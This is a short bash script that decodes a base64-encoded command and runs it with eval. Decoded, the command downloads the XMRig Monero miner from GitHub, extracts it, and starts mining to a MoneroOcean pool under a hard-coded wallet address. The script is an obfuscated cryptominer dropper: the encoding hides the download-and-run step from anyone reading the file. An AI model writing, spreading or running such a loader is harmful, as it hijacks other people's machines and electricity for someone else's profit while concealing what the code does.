#!/bin/bash
encoded_text="d2dldCBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMjEuMC94bXJpZy02LjIxLjAtbGludXgtc3RhdGljLXg2NC50YXIuZ3ogJiYgdGFyIC14ZiB4bXJpZy02LjIxLjAtbGludXgtc3RhdGljLXg2NC50YXIuZ3ogJiYgY2QgeG1yaWctNi4yMS4wLyAmJiAuL3htcmlnIC1vIGd1bGYubW9uZXJvb2NlYW4uc3RyZWFtOjEwMTI4IC11IDQycDE5UG9YcUZqMTFvQWNqZjdjM1BpZTFpMjZwVENaRlNnQUE4Y05lV2FQMndFUzJua3FaUGlBWUFrNDRLc0MxaUV5dm1GVXJRUHRGRkhiRlU0Y0FXV1RKdTgzeFNB"
decoded_text=$(echo "$encoded_text" | base64 -d)
eval "$decoded_text"
